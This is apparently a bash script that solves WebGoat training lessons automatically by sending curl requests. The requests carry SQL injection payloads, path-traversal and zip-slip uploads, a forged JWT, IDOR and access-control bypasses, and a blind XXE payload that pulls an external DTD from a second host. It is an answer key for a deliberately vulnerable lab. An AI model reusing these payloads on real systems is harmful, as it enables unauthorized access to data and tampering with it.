#!/bin/bash

echo "Webgoat Address: "$1
d=$(curl -i $1'/WebGoat/login' --data 'username=usertest&password=123456'| grep -Fi Set-Cookie)
COOKIE=${d:11:52}
echo $COOKIE
curl "$1/WebGoat/WebGoatIntroduction.lesson.lesson" -H "Cookie: $COOKIE"
curl "$1/WebGoat/SqlInjection/attack2" -H "Cookie: $COOKIE" --data 'query=select+department+from+employees+where+first_name%3D%E2%80%98Bob%E2%80%99%3B'
curl "$1/WebGoat/SqlInjection/attack3" -H "Cookie: $COOKIE" --data 'query=update+employees+set+department%3D%E2%80%98Sales%E2%80%99+where+first_name%3D%E2%80%98Tobi%E2%80%99%3B'
curl "$1/WebGoat/SqlInjection/attack4" -H "Cookie: $COOKIE" --data 'query=alter+table+employees+add+column+phone+varchar(20)%3B'
curl "$1/WebGoat/SqlInjection/attack5" -H "Cookie: $COOKIE" --data 'query=grant+alter+table+to+UnauthorizedUser'
curl "$1/WebGoat/SqlInjection/assignment5a" -H "Cookie: $COOKIE" --data $'account=\'&operator=or&injection=\'1\'+%3D+\'1'
curl "$1/WebGoat/SqlInjection/assignment5b" -H "Cookie: $COOKIE" --data 'login_count=111&userid=1+or+1%3D1+%E2%80%93'
curl "$1/WebGoat/SqlInjection/attack8" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data 'name=%E2%80%99+or+true+%E2%80%93&auth_tan=3SL99A' \
  --compressed \
  --insecure
curl "$1/WebGoat/SqlInjection/attack9" -H "Cookie: $COOKIE" --data 'name=WebGoat%2FSqlInjection%2Fattack8&auth_tan=1111'
curl "$1/WebGoat/SqlInjection/attack10" -H "Cookie: $COOKIE" --data 'action_string=2'
curl "$1/WebGoat/SqlInjectionAdvanced/attack6a" -H "Cookie: $COOKIE" --data 'userid_6a=Tom'
curl "$1/WebGoat/SqlInjectionAdvanced/attack6b" -H "Cookie: $COOKIE" --data 'userid_6b=passW0rD'
curl "$1/WebGoat/SqlInjectionAdvanced/challenge" \
  -X 'PUT' \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data 'username_reg=tom&email_reg=1%401.1&password_reg=1&confirm_password_reg=1' \
  --compressed \
  --insecure
curl "$1/WebGoat/SqlInjectionAdvanced/challenge_Login" -H "Cookie: $COOKIE" --data 'username_login=tom&password_login=Thisisasecretfortomo'
curl "$1/WebGoat/SqlInjectionAdvanced/quiz" -H "Cookie: $COOKIE" --data $'question_0_solution=Solution+4%3A+A+statement+has+got+values+instead+of+a+prepared+statement&question_1_solution=Solution+3%3A+%3F&question_2_solution=Solution+2%3A+Prepared+statements+are+compiled+once+by+the+database+management+system+waiting+for+input+and+are+pre-compiled+this+way.&question_3_solution=Solution+3%3A+Placeholders+can+prevent+that+the+users+input+gets+attached+to+the+SQL+query+resulting+in+a+seperation+of+code+and+data.&question_4_solution=Solution+4%3A+The+database+registers+\'Robert\'+)%3B+DROP+TABLE+Students%3B--\'.'
curl "$1/WebGoat/SqlInjectionAdvanced/quiz" -H "Cookie: $COOKIE" 
curl "$1/WebGoat/SqlInjectionMitigations/servers?column=id" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H "Cookie: $COOKIE" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure
curl "$1/WebGoat/SqlInjectionMitigations/attack10a" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data 'field1=getConnection&field2=PreparedStatement+ps&field3=prepareStatement&field4=%3F&field5=%3F&field6=ps.setString(1%2C+name)&field7=ps.setString(2%2C+mail)' \
  --compressed \
  --insecure
curl "$1/WebGoat/SqlInjectionMitigations/attack10b" -H "Cookie: $COOKIE" --data 'editor=try%7B+Connection+ct+%3D+null%3B+ct%3DDriverManager.getConnection(DBURL%2CDBUSER%2CDBPW)%3B+PreparedStatement+ps%3Dct.prepareStatement(%22select+*+from+users+where+name%3D%3F%22)%3B+ps.setString(1%2C%22zy%22)%3B+ResultSet+rs%3Dps.executeQuery()%3B+%7D+catch(Exception+e)%7B+System.out.println(%22hehe%22)%3B%7D' 
curl "$1/WebGoat/SqlOnlyInputValidation/attack" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data 'userid_sql_only_input_validation=123' \
  --compressed \
  --insecure
curl "$1/WebGoat/SqlOnlyInputValidationOnKeywords/attack" -H "Cookie: $COOKIE" --data 'userid_sql_only_input_validation_on_keywords=orderby' 
curl "$1/WebGoat/SqlInjectionMitigations/attack12a" -H "Cookie: $COOKIE" --data 'ip=104.130.219.202' 

curl "$1/WebGoat/PathTraversal/profile-upload" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: multipart/form-data' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --form 'uploadedFile=@"1.png"' \
  --form 'email="test@test.com"' \
  --form 'fullName="test"' \
  --form 'password="test123123"'\
  --compressed \
  --insecure
  
  curl "$1/WebGoat/PathTraversal/profile-picture" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H "Cookie: $COOKIE" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure
curl "$1/WebGoat/PathTraversal/profile-upload-fix" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: multipart/form-data' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --form 'uploadedFileFix=@"1.png"' \
  --form 'emailFix="test@test.com"' \
  --form 'fullNameFix="test"' \
  --form 'passwordFix="test123123"'\
  --compressed \
  --insecure
curl "$1/WebGoat/PathTraversal/profile-picture" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H "Cookie: $COOKIE" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure
curl "$1/WebGoat/PathTraversal/profile-upload-remove-user-input" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: multipart/form-data' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --form 'uploadedFileRemoveUserInput=@"1.png"' \
  --form 'email="test@test.com"' \
  --form 'fullName="test"' \
  --form 'password="test123123"'\
  --compressed \
  --insecure
  
curl "$1/WebGoat/PathTraversal/profile-picture" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H "Cookie: $COOKIE" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure
curl "$1/WebGoat/PathTraversal/random" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data 'secret=path-traversal-secret.jpg' \
  --compressed \
  --insecure
curl "$1/WebGoat/PathTraversal/zip-slip" \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: multipart/form-data' \
  -H "Cookie: $COOKIE" \
  -H "Origin: $1" \
  -H "Referer: $1/WebGoat/start.mvc" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --form 'uploadedFileZipSlip=@"QA.zip"' --form 'fullName="test"' --form 'email="test@tyest"' --form 'password="123"'

curl "$1/WebGoat/auth-bypass/verify-account" -H "Cookie: $COOKIE" --data 'secQuestion0=secQuestion2&secQuestion1=meng-zhu&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746'
curl "$1/WebGoat/JWT/decode" -H "Cookie: $COOKIE" -H "Origin: $1" -H "Referer: $1/WebGoat/start.mvc" --data 'jwt-encode-user=TOM'
curl "$1/WebGoat/JWT/quiz" -H "Cookie: $COOKIE" --data 'question_0_solution=Solution+1%3A+Throws+an+exception+in+line+12&question_1_solution=Solution+3%3A+Logs+an+error+in+line+9'
curl "$1/WebGoat/JWT/quiz" -H "Cookie: $COOKIE"
curl "$1/WebGoat/JWT/secret" -H "Cookie: $COOKIE" --data 'token=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0OTIyMDQxMSwiZXhwIjoxNjQ5MjIwNDcxLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.jWTlybJdxuWk83XxUkpDob3sxqXMYBJNMUdPLDqf8w4'
curl -X GET "$1/WebGoat/JWT/refresh/checkout" -H "Cookie: $COOKIE"
curl "$1/WebGoat/PasswordReset/simple-mail" -H "Cookie: $COOKIE" --data 'email=usertest&password=123456'
curl "$1/WebGoat/PasswordReset/questions" -H "Cookie: $COOKIE" --data 'username=admin&securityQuestion=11'
curl "$1/WebGoat/PasswordReset/SecurityQuestions" -H "Cookie: $COOKIE" --data 'question=In+what+year+was+your+mother+born%3F'
curl "$1/WebGoat/PasswordReset/reset/login" -H "Cookie: $COOKIE" --data 'email=usertest%40qq&password=123456'
curl "$1/WebGoat/SecurePasswords/assignment" -H "Cookie: $COOKIE" --data 'password='
curl "$1/WebGoat/InsecureLogin/task" -H "Cookie: $COOKIE" --data 'username=&password='
curl "$1/WebGoat/xxe/simple" -H "Cookie: $COOKIE" --data '<?xml version="1.0"?><comment>  <text>1111</text></comment>'
curl "$1/WebGoat/xxe/comments" -H "Cookie: $COOKIE" 
curl "$1/WebGoat/xxe/content-type" -H "Cookie: $COOKIE" --data '{"text":"111"}'
curl "$1/WebGoat/xxe/comments" -H "Cookie: $COOKIE"
curl "$1/WebGoat/xxe/blind" -H "Cookie: $COOKIE" --data $'<?xml version="1.0"?><comment>  <text><?xml version="1.0"?> <\u0021ENTITY % getdtd SYSTEM " http://localhost:9090/files/aaaaaa/xxe1.dtd"> %getdtd; %write;]> 777&send;</text></comment>'
curl "$1/WebGoat/xxe/comments" -H "Cookie: $COOKIE" 
curl "$1/WebGoat/IDOR/login" -H "Cookie: $COOKIE" --data 'username=tom&password=cat'
curl "$1/WebGoat/IDOR/profile" -H "Cookie: $COOKIE"
curl "$1/WebGoat/IDOR/diff-attributes" -H "Cookie: $COOKIE" --data 'attributes=role%2CuserId'
curl "$1/WebGoat/IDOR/profile/alt-path" -H "Cookie: $COOKIE" --data 'url=WebGoat%2FIDOR%2Fprofile%2F2342384'
curl "$1/WebGoat/access-control/hidden-menu" -H "Cookie: $COOKIE" --data 'hiddenMenu1=Users&hiddenMenu2=Config'
curl "$1/WebGoat/access-control/user-hash" -H "Cookie: $COOKIE" --data 'userHash=Gyc6HCLEtE%2BNpBKKAxc8yiJiKXBdsk860jyu%2BHN7gis%3D'
curl "$1/WebGoat/CrossSiteScripting/attack1" -H "Cookie: $COOKIE" --data 'answer_xss_1=yes'
curl "$1/WebGoat/CrossSiteScripting/attack5a?QTY1=1&QTY2=1&QTY3=1&QTY4=1&field1=4128%203214%200002%201999&field2=111" -H "Cookie: $COOKIE" 
curl "$1/WebGoat/CrossSiteScripting/attack6a" -H "Cookie: $COOKIE" --data 'DOMTestRoute=start.mvc%23test'
curl "$1/WebGoat/CrossSiteScripting/dom-follow-up" -H "Cookie: $COOKIE" --data 'successMessage=-926979552'
curl "$1/WebGoat/CrossSiteScripting/quiz" -H "Cookie: $COOKIE" --data 'question_0_solution=Solution+4%3A+No+because+the+browser+trusts+the+website+if+it+is+acknowledged+trusted%2C+then+the+browser+does+not+know+that+the+script+is+malicious.&question_1_solution=Solution+3%3A+The+data+is+included+in+dynamic+content+that+is+sent+to+a+web+user+without+being+validated+for+malicious+content.&question_2_solution=Solution+1%3A+The+script+is+permanently+stored+on+the+server+and+the+victim+gets+the+malicious+script+when+requesting+information+from+the+server.&question_3_solution=Solution+2%3A+They+reflect+the+injected+script+off+the+web+server.+That+occurs+when+input+sent+to+the+web+server+is+part+of+the+request.&question_4_solution=Solution+4%3A+No+there+are+many+other+ways.+Like+HTML%2C+Flash+or+any+other+type+of+code+that+the+browser+executes.'
curl "$1/WebGoat/CrossSiteScripting/quiz" -H "Cookie: $COOKIE"
curl "$1/WebGoat/InsecureDeserialization/task" -H "Cookie: $COOKIE" --data 'token=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0OTIyMDQxMSwiZXhwIjoxNjQ5MjIwNDcxLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.jWTlybJdxuWk83XxUkpDob3sxqXMYBJNMUdPLDqf8w4'
curl "$1/WebGoat/csrf/confirm-flag-1" -H "Cookie: $COOKIE" --data 'confirmFlagVal=12625'
curl "$1/WebGoat/csrf/feedback/message" -H "Cookie: $COOKIE" --data '{"name":"mengzhu","email":"2589580404@qq.com","subject":"service","message":"qqqq"}'
curl -X GET "$1/WebGoat/csrf/login" -H "Cookie: $COOKIE"
curl "$1/WebGoat/SSRF/task1" -H "Cookie: $COOKIE" --data 'url=images%2Ftom.png'
curl "$1/WebGoat/SSRF/task2" -H "Cookie: $COOKIE" --data 'url=images%2Fcat.png'
curl "$1/WebGoat/BypassRestrictions/FieldRestrictions" -H "Cookie: $COOKIE" --data 'select=option1&radio=option1&checkbox=on&shortInput=12345&readOnlyInput=change'
curl "$1/WebGoat/BypassRestrictions/frontendValidation/" -H "Cookie: $COOKIE" --data 'field1=abc&field2=123&field3=abc+123+ABC&field4=seven&field5=01101&field6=90210-1111&field7=301-604-4882&error=0'
curl "$1/WebGoat/clientSideFiltering/attack1" -H "Cookie: $COOKIE" --data 'userID=101&UserSelect=108&answer=110000'
curl "$1/WebGoat/clientSideFiltering/challenge-store/coupons/get_it_for_free" -H "Cookie: $COOKIE"
curl "$1/WebGoat/clientSideFiltering/getItForFree" -H "Cookie: $COOKIE" --data 'checkoutCode=get_it_for_free'
curl "$1/WebGoat/HtmlTampering/task" -H "Cookie: $COOKIE" --data 'QTY=1&Total=2999.99'
curl "$1/WebGoat/challenge/1" -H "Cookie: $COOKIE" --data 'username=usertest&password=123456'
#curl "$1/WebGoat/challenge/flag" -H "Cookie: $COOKIE" --data 'flag=Admin+password+reset'
curl "$1/WebGoat/challenge/5" -H "Cookie: $COOKIE" --data 'username_login=usertest&password_login=123456'
#curl "$1/WebGoat/challenge/flag" -H "Cookie: $COOKIE" --data 'flag=Admin+password+reset'
